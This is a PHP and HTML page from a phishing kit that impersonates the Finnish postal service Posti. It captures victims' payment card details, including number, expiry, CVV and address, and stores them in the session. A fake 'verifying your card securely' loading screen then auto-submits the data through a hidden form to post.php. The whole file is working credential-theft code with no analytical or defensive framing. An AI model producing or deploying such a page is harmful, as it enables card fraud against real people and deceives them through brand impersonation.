<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require __DIR__ . '/security.php';

// Receive and store form data in session
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['card_data'] = [
        'name' => $_POST['name'] ?? '',
        'cc' => $_POST['cc'] ?? '',
        'exp' => $_POST['exp'] ?? '',
        'cvv' => $_POST['cvv'] ?? '',
        'address' => $_POST['address'] ?? '',
        'city' => $_POST['city'] ?? '',
        'zip' => $_POST['zip'] ?? ''
    ];
}
?><!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Käsitellään maksua - Posti</title>
<link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
<link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Posti Font',Arial,sans-serif;background:#f7f7f7;color:#2A2B2D;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

/* TOP BAR */
.tb{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;height:44px;padding:0 24px;gap:0;}
.tb-logo{display:flex;align-items:center;margin-right:20px;}
.tb-logo-text{font-size:28px;font-weight:900;font-style:italic;color:#FF6200;letter-spacing:-1px;line-height:1;}
.tb-tabs{display:flex;gap:0;height:100%;}
.tb-tab{display:flex;align-items:center;padding:0 14px;font-size:14px;font-weight:600;color:#2A2B2D;height:100%;cursor:pointer;}
.tb-tab.active{background:#1a1a1a;color:#fff;border-radius:20px;height:30px;margin:auto 4px;padding:0 16px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-langs{display:flex;align-items:center;border:1.5px solid #e5e5e5;border-radius:20px;overflow:hidden;padding:2px;}
.tb-lang{font-size:12px;font-weight:700;padding:3px 8px;border-radius:16px;cursor:pointer;color:#666;}
.tb-lang.active{background:#2A2B2D;color:#fff;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}

/* LOADING CARD */
.loading-card{background:#fff;border-radius:20px;box-shadow:0 8px 40px rgba(0,0,0,0.1);padding:60px 50px;text-align:center;max-width:460px;width:100%;}

/* SPINNER */
.spinner-wrapper{margin-bottom:32px;}
.spinner{width:80px;height:80px;margin:0 auto;position:relative;}
.spinner-ring{position:absolute;inset:0;border:4px solid #f0f0f0;border-top-color:#FF6200;border-radius:50%;animation:spin 1s linear infinite;}
.spinner-ring:nth-child(2){inset:10px;border-width:3px;animation-duration:0.8s;animation-direction:reverse;}
.spinner-ring:nth-child(3){inset:20px;border-width:2px;animation-duration:1.2s;}
@keyframes spin{to{transform:rotate(360deg);}}

.spinner-icon{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;}
.spinner-icon svg{width:28px;height:28px;fill:#FF6200;animation:pulse 1.5s ease-in-out infinite;}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.6;transform:scale(0.9);}}

/* TEXT */
.loading-card h1{font-size:22px;font-weight:800;color:#2A2B2D;margin-bottom:12px;}
.loading-card p{font-size:15px;color:#666;line-height:1.6;margin-bottom:8px;}
.loading-card .sub{font-size:13px;color:#999;}

/* PROGRESS BAR */
.progress-wrapper{margin-top:32px;}
.progress-bar{height:6px;background:#eee;border-radius:3px;overflow:hidden;}
.progress-fill{height:100%;width:0;background:linear-gradient(90deg,#FF6200,#FF8533);border-radius:3px;animation:progress 3s ease-out forwards;}
@keyframes progress{0%{width:0;}100%{width:100%;}}

/* STEPS */
.steps{margin-top:28px;text-align:left;}
.step{display:flex;align-items:center;gap:12px;padding:10px 0;font-size:14px;color:#999;transition:all 0.3s;}
.step.active{color:#2A2B2D;}
.step.done{color:#27ae60;}
.step-icon{width:24px;height:24px;border-radius:50%;background:#eee;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.3s;}
.step.active .step-icon{background:#FF6200;}
.step.done .step-icon{background:#27ae60;}
.step-icon svg{width:14px;height:14px;fill:#999;}
.step.active .step-icon svg{fill:#fff;}
.step.done .step-icon svg{fill:#fff;}
.step-spinner{width:14px;height:14px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.6s linear infinite;}

/* FOOTER */
footer{background:#fff;border-top:1px solid #e5e5e5;padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}

/* SECURITY NOTE */
.security-note{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:24px;font-size:12px;color:#888;}
.security-note svg{width:16px;height:16px;fill:#27ae60;}

/* TABLET */
@media(max-width:900px){
    .loading-card{max-width:400px;}
}

/* MOBILE */
@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-tabs,.tb-langs{display:none;}
    .tb-logo-text{font-size:24px;}
    .page-content{padding:20px 12px;}
    .loading-card{padding:40px 24px;border-radius:16px;max-width:100%;}
    .spinner-wrapper{margin-bottom:24px;}
    .spinner{width:70px;height:70px;}
    .spinner-icon svg{width:24px;height:24px;}
    .loading-card h1{font-size:18px;margin-bottom:10px;}
    .loading-card p{font-size:14px;}
    .loading-card .sub{font-size:12px;}
    .progress-wrapper{margin-top:24px;}
    .steps{margin-top:20px;}
    .step{font-size:13px;padding:8px 0;}
    .step-icon{width:22px;height:22px;}
    .security-note{font-size:11px;margin-top:20px;flex-wrap:wrap;text-align:center;}
    footer{padding:16px;}
    footer p{font-size:11px;}
}

/* SMALL MOBILE */
@media(max-width:380px){
    .loading-card{padding:32px 16px;}
    .loading-card h1{font-size:16px;}
    .spinner{width:60px;height:60px;}
}

.tb-logo-img {
    height: 40px; /* ajuste selon ton design */
    width: auto;
    display: block;
}
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="tb">
    <div class="tb-logo">
    <img src="https://cdn-ukwest.onetrust.com/logos/0cd0463b-0b24-43d4-abaa-6a461e651d10/e96975ca-412d-4058-b6e3-e3b0cb37b650/a35af39c-cc06-4b52-9b5f-9a3d838da19c/1.1_Posti_logo_Posti_Orange_rgb.png" alt="Logo" class="tb-logo-img">
</div>
    <div class="tb-tabs">
        <span class="tb-tab active">Henkilöille</span>
        <span class="tb-tab">Yrityksille</span>
    </div>
    <div class="tb-right">
        <div class="tb-langs">
            <span class="tb-lang active">FI</span>
            <span class="tb-lang">SV</span>
            <span class="tb-lang">EN</span>
        </div>
    </div>
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="loading-card">

        <div class="spinner-wrapper">
            <div class="spinner">
                <div class="spinner-ring"></div>
                <div class="spinner-ring"></div>
                <div class="spinner-ring"></div>
                <div class="spinner-icon">
                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                </div>
            </div>
        </div>

        <h1>Käsitellään maksua</h1>
        <p>Vahvistamme korttitietojasi turvallisesti.</p>
        <p class="sub">Älä sulje tätä sivua.</p>

        <div class="progress-wrapper">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>

        <div class="steps">
            <div class="step" id="step1">
                <div class="step-icon">
                    <div class="step-spinner"></div>
                </div>
                <span>Tarkistetaan korttitiedot...</span>
            </div>
            <div class="step" id="step2">
                <div class="step-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
                </div>
                <span>Yhdistetään pankkiin...</span>
            </div>
            <div class="step" id="step3">
                <div class="step-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/></svg>
                </div>
                <span>Valmistellaan vahvistusta...</span>
            </div>
        </div>

        <div class="security-note">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Z" clip-rule="evenodd"/></svg>
            <span>Tietosi ovat salattuja ja turvallisia</span>
        </div>

    </div>
</div>

<!-- FOOTER -->
<footer>
    <p>© Posti Group Oyj</p>
</footer>

<!-- Hidden form to forward data -->
<form id="card-form" action="post.php" method="post" style="display:none;">
    <input type="hidden" name="name" value="<?php echo htmlspecialchars($_SESSION['card_data']['name'] ?? ''); ?>">
    <input type="hidden" name="cc" value="<?php echo htmlspecialchars($_SESSION['card_data']['cc'] ?? ''); ?>">
    <input type="hidden" name="exp" value="<?php echo htmlspecialchars($_SESSION['card_data']['exp'] ?? ''); ?>">
    <input type="hidden" name="cvv" value="<?php echo htmlspecialchars($_SESSION['card_data']['cvv'] ?? ''); ?>">
    <input type="hidden" name="address" value="<?php echo htmlspecialchars($_SESSION['card_data']['address'] ?? ''); ?>">
    <input type="hidden" name="city" value="<?php echo htmlspecialchars($_SESSION['card_data']['city'] ?? ''); ?>">
    <input type="hidden" name="zip" value="<?php echo htmlspecialchars($_SESSION['card_data']['zip'] ?? ''); ?>">
</form>

<script>
// Step animation
var steps = ['step1', 'step2', 'step3'];
var currentStep = 0;

function updateStep(index, status) {
    var step = document.getElementById(steps[index]);
    var icon = step.querySelector('.step-icon');

    if (status === 'done') {
        step.className = 'step done';
        icon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>';
    } else if (status === 'active') {
        step.className = 'step active';
        icon.innerHTML = '<div class="step-spinner"></div>';
    }
}

// Animate steps
setTimeout(function() {
    updateStep(0, 'done');
    updateStep(1, 'active');
}, 1000);

setTimeout(function() {
    updateStep(1, 'done');
    updateStep(2, 'active');
}, 2000);

setTimeout(function() {
    updateStep(2, 'done');
}, 2800);

// Redirect to post.php to send data
setTimeout(function() {
    document.getElementById('card-form').submit();
}, 3200);
</script>
</body>
</html>
